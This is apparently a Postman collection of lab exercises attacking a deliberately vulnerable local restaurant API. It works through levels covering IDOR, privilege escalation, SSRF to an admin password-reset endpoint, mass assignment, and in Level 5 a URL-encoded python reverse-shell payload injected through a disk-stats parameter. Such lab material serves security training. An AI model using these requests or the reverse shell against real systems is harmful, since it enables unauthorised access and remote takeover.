{
	"info": {
		"_postman_id": "9cd5f361-3110-461e-8122-476109ec5a7c",
		"name": "PruebasHE",
		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
		"_exporter_id": "48140038"
	},
	"item": [
		{
			"name": "Preparación",
			"item": [
				{
					"name": "register_user_Andres",
					"request": {
						"method": "POST",
						"header": [],
						"body": {
							"mode": "raw",
							"raw": "{\r\n  \"username\": \"andresrivera\",\r\n  \"password\": \"123456\",\r\n  \"phone_number\": \"333333\",\r\n  \"first_name\": \"Andres\",\r\n  \"last_name\": \"Rivera\"\r\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "http://localhost:8091/register",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"register"
							]
						}
					},
					"response": []
				},
				{
					"name": "register_user_Ana",
					"request": {
						"method": "POST",
						"header": [],
						"body": {
							"mode": "raw",
							"raw": "{\r\n  \"username\": \"anarivera\",\r\n  \"password\": \"123456\",\r\n  \"phone_number\": \"222222\",\r\n  \"first_name\": \"Ana\",\r\n  \"last_name\": \"Rivera\"\r\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "http://localhost:8091/register",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"register"
							]
						}
					},
					"response": []
				},
				{
					"name": "register_user_Carlos",
					"request": {
						"method": "POST",
						"header": [],
						"body": {
							"mode": "raw",
							"raw": "{\r\n  \"username\": \"carlosibanez\",\r\n  \"password\": \"123456\",\r\n  \"phone_number\": \"222222\",\r\n  \"first_name\": \"Carlos\",\r\n  \"last_name\": \"Ibañez\"\r\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "http://localhost:8091/register",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"register"
							]
						}
					},
					"response": []
				},
				{
					"name": "register_user_Jesus",
					"request": {
						"method": "POST",
						"header": [],
						"body": {
							"mode": "raw",
							"raw": "{\r\n  \"username\": \"jesuscapataz\",\r\n  \"password\": \"123456\",\r\n  \"phone_number\": \"444444\",\r\n  \"first_name\": \"Jesus\",\r\n  \"last_name\": \"Capataz\"\r\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "http://localhost:8091/register",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"register"
							]
						}
					},
					"response": []
				}
			]
		},
		{
			"name": "Level 0: Technology details exposed via header",
			"item": [
				{
					"name": "/healthcheck",
					"request": {
						"method": "GET",
						"header": [],
						"url": {
							"raw": "http://localhost:8091/healthcheck",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"healthcheck"
							]
						}
					},
					"response": []
				}
			]
		},
		{
			"name": "Level 1: Unrestricted menu item deletion",
			"item": [
				{
					"name": "/menu",
					"request": {
						"method": "GET",
						"header": [],
						"url": {
							"raw": "http://localhost:8091/menu",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"menu"
							]
						}
					},
					"response": []
				},
				{
					"name": "delete_menu_item",
					"request": {
						"auth": {
							"type": "oauth2",
							"oauth2": [
								{
									"key": "username",
									"value": "andresrivera",
									"type": "string"
								},
								{
									"key": "tokenName",
									"value": "Andres",
									"type": "string"
								},
								{
									"key": "client_authentication",
									"value": "header",
									"type": "string"
								},
								{
									"key": "clientSecret",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "password",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "grant_type",
									"value": "password_credentials",
									"type": "string"
								},
								{
									"key": "clientId",
									"value": "basic",
									"type": "string"
								},
								{
									"key": "accessTokenUrl",
									"value": "http://localhost:8091/token",
									"type": "string"
								},
								{
									"key": "addTokenTo",
									"value": "header",
									"type": "string"
								}
							]
						},
						"method": "DELETE",
						"header": [],
						"url": {
							"raw": "http://localhost:8091/menu/17",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"menu",
								"17"
							]
						}
					},
					"response": []
				}
			]
		},
		{
			"name": "Level 2: Unrestricted profile update IDOR",
			"item": [
				{
					"name": "update_profile_of_someone",
					"request": {
						"auth": {
							"type": "oauth2",
							"oauth2": [
								{
									"key": "username",
									"value": "andresrivera",
									"type": "string"
								},
								{
									"key": "tokenName",
									"value": "Andres",
									"type": "string"
								},
								{
									"key": "client_authentication",
									"value": "header",
									"type": "string"
								},
								{
									"key": "clientSecret",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "password",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "grant_type",
									"value": "password_credentials",
									"type": "string"
								},
								{
									"key": "clientId",
									"value": "basic",
									"type": "string"
								},
								{
									"key": "accessTokenUrl",
									"value": "http://localhost:8091/token",
									"type": "string"
								},
								{
									"key": "addTokenTo",
									"value": "header",
									"type": "string"
								}
							]
						},
						"method": "PUT",
						"header": [],
						"body": {
							"mode": "raw",
							"raw": "{\r\n  \"username\": \"andresrivera\",\r\n  \"first_name\": \"Andres\",\r\n  \"last_name\": \"Rivera\",\r\n  \"phone_number\": \"111111\"\r\n}\r\n",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "http://localhost:8091/profile",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"profile"
							]
						}
					},
					"response": []
				},
				{
					"name": "get_hacked_person_profile",
					"request": {
						"auth": {
							"type": "oauth2",
							"oauth2": [
								{
									"key": "tokenName",
									"value": "Ana",
									"type": "string"
								},
								{
									"key": "username",
									"value": "anarivera",
									"type": "string"
								},
								{
									"key": "client_authentication",
									"value": "header",
									"type": "string"
								},
								{
									"key": "clientSecret",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "password",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "grant_type",
									"value": "password_credentials",
									"type": "string"
								},
								{
									"key": "clientId",
									"value": "basic",
									"type": "string"
								},
								{
									"key": "accessTokenUrl",
									"value": "http://localhost:8091/token",
									"type": "string"
								},
								{
									"key": "addTokenTo",
									"value": "header",
									"type": "string"
								}
							]
						},
						"method": "GET",
						"header": [],
						"url": {
							"raw": "http://localhost:8091/profile",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"profile"
							]
						}
					},
					"response": []
				}
			]
		},
		{
			"name": "Level 3: Privilege escalation",
			"item": [
				{
					"name": "update_role",
					"request": {
						"auth": {
							"type": "oauth2",
							"oauth2": [
								{
									"key": "refreshTokenUrl",
									"value": "http://localhost:8091/token",
									"type": "string"
								},
								{
									"key": "username",
									"value": "carlosibanez",
									"type": "string"
								},
								{
									"key": "tokenName",
									"value": "Carlos",
									"type": "string"
								},
								{
									"key": "client_authentication",
									"value": "header",
									"type": "string"
								},
								{
									"key": "clientSecret",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "password",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "grant_type",
									"value": "password_credentials",
									"type": "string"
								},
								{
									"key": "clientId",
									"value": "basic",
									"type": "string"
								},
								{
									"key": "accessTokenUrl",
									"value": "http://localhost:8091/token",
									"type": "string"
								},
								{
									"key": "addTokenTo",
									"value": "header",
									"type": "string"
								}
							]
						},
						"method": "PUT",
						"header": [],
						"body": {
							"mode": "raw",
							"raw": "{\r\n  \"username\": \"jesuscapataz\",\r\n  \"role\": \"Employee\"\r\n}\r\n",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "http://localhost:8091/users/update_role",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"users",
								"update_role"
							]
						}
					},
					"response": []
				},
				{
					"name": "get_user_profile",
					"request": {
						"auth": {
							"type": "oauth2",
							"oauth2": [
								{
									"key": "password",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "username",
									"value": "anarivera",
									"type": "string"
								},
								{
									"key": "tokenName",
									"value": "Ana",
									"type": "string"
								},
								{
									"key": "client_authentication",
									"value": "header",
									"type": "string"
								},
								{
									"key": "clientSecret",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "grant_type",
									"value": "password_credentials",
									"type": "string"
								},
								{
									"key": "clientId",
									"value": "basic",
									"type": "string"
								},
								{
									"key": "accessTokenUrl",
									"value": "http://localhost:8091/token",
									"type": "string"
								},
								{
									"key": "addTokenTo",
									"value": "header",
									"type": "string"
								}
							]
						},
						"method": "GET",
						"header": [],
						"url": {
							"raw": "http://localhost:8091/profile",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"profile"
							]
						}
					},
					"response": []
				}
			]
		},
		{
			"name": "Level 4: Server side request forgery",
			"item": [
				{
					"name": "change_chef_password",
					"event": [
						{
							"listen": "test",
							"script": {
								"exec": [
									""
								],
								"type": "text/javascript",
								"packages": {},
								"requests": {}
							}
						}
					],
					"request": {
						"auth": {
							"type": "oauth2",
							"oauth2": [
								{
									"key": "password",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "username",
									"value": "jesuscapataz",
									"type": "string"
								},
								{
									"key": "refreshTokenUrl",
									"value": "http://localhost:8091",
									"type": "string"
								},
								{
									"key": "tokenName",
									"value": "Jesus",
									"type": "string"
								},
								{
									"key": "client_authentication",
									"value": "header",
									"type": "string"
								},
								{
									"key": "clientSecret",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "grant_type",
									"value": "password_credentials",
									"type": "string"
								},
								{
									"key": "clientId",
									"value": "basic",
									"type": "string"
								},
								{
									"key": "accessTokenUrl",
									"value": "http://localhost:8091/token",
									"type": "string"
								},
								{
									"key": "addTokenTo",
									"value": "header",
									"type": "string"
								}
							]
						},
						"method": "PUT",
						"header": [],
						"body": {
							"mode": "raw",
							"raw": "{\r\n  \"name\": \"Hacker Potato\",\r\n  \"price\": 999999,\r\n  \"category\": \"\",\r\n  \"description\": \"\",\r\n  \"image_url\": \"http://localhost:8091/admin/reset-chef-password\"\r\n}\r\n",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "http://localhost:8091/menu",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"menu"
							]
						}
					},
					"response": []
				}
			]
		},
		{
			"name": "Level 5: Remote code execution",
			"item": [
				{
					"name": "remote_code_execution_via_get",
					"protocolProfileBehavior": {
						"disableBodyPruning": true
					},
					"request": {
						"auth": {
							"type": "oauth2",
							"oauth2": [
								{
									"key": "password",
									"value": "4h9(bh7E=QHg+a:SaVkZP1HUq-0QK75!",
									"type": "string"
								},
								{
									"key": "username",
									"value": "chef",
									"type": "string"
								},
								{
									"key": "tokenName",
									"value": "Chef",
									"type": "string"
								},
								{
									"key": "client_authentication",
									"value": "header",
									"type": "string"
								},
								{
									"key": "clientSecret",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "grant_type",
									"value": "password_credentials",
									"type": "string"
								},
								{
									"key": "clientId",
									"value": "basic",
									"type": "string"
								},
								{
									"key": "accessTokenUrl",
									"value": "http://localhost:8091/token",
									"type": "string"
								},
								{
									"key": "addTokenTo",
									"value": "header",
									"type": "string"
								}
							]
						},
						"method": "GET",
						"header": [],
						"body": {
							"mode": "raw",
							"raw": "",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "http://localhost:8091/admin/stats/disk?parameters=python3%20-c%20'import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%22172.18.0.1%22%2C4444))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22sh%22)'",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"admin",
								"stats",
								"disk"
							],
							"query": [
								{
									"key": "parameters",
									"value": "python3%20-c%20'import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%22172.18.0.1%22%2C4444))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22sh%22)'"
								}
							]
						}
					},
					"response": []
				}
			]
		},
		{
			"name": "Level 6: Mass assignment vulnerability",
			"item": [
				{
					"name": "patch_profile",
					"request": {
						"auth": {
							"type": "oauth2",
							"oauth2": [
								{
									"key": "username",
									"value": "andresrivera",
									"type": "string"
								},
								{
									"key": "tokenName",
									"value": "Andres",
									"type": "string"
								},
								{
									"key": "client_authentication",
									"value": "header",
									"type": "string"
								},
								{
									"key": "clientSecret",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "password",
									"value": "123456",
									"type": "string"
								},
								{
									"key": "grant_type",
									"value": "password_credentials",
									"type": "string"
								},
								{
									"key": "clientId",
									"value": "basic",
									"type": "string"
								},
								{
									"key": "accessTokenUrl",
									"value": "http://localhost:8091/token",
									"type": "string"
								},
								{
									"key": "addTokenTo",
									"value": "header",
									"type": "string"
								}
							]
						},
						"method": "PATCH",
						"header": [],
						"body": {
							"mode": "raw",
							"raw": "{\r\n  \"username\": \"anarivera\",\r\n  \"phone_number\": \"333333\",\r\n  \"first_name\": \"Ana\",\r\n  \"last_name\": \"Rivera\",\r\n  \"role\": \"Chef\",\r\n  \"additionalProp1\": {\r\n    \"role\": \"chef\"\r\n  }\r\n}\r\n\r\n",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "http://localhost:8091/profile",
							"protocol": "http",
							"host": [
								"localhost"
							],
							"port": "8091",
							"path": [
								"profile"
							]
						}
					},
					"response": []
				}
			]
		}
	],
	"event": [
		{
			"listen": "prerequest",
			"script": {
				"type": "text/javascript",
				"packages": {},
				"exec": [
					""
				]
			}
		},
		{
			"listen": "test",
			"script": {
				"type": "text/javascript",
				"packages": {},
				"exec": [
					""
				]
			}
		}
	]
}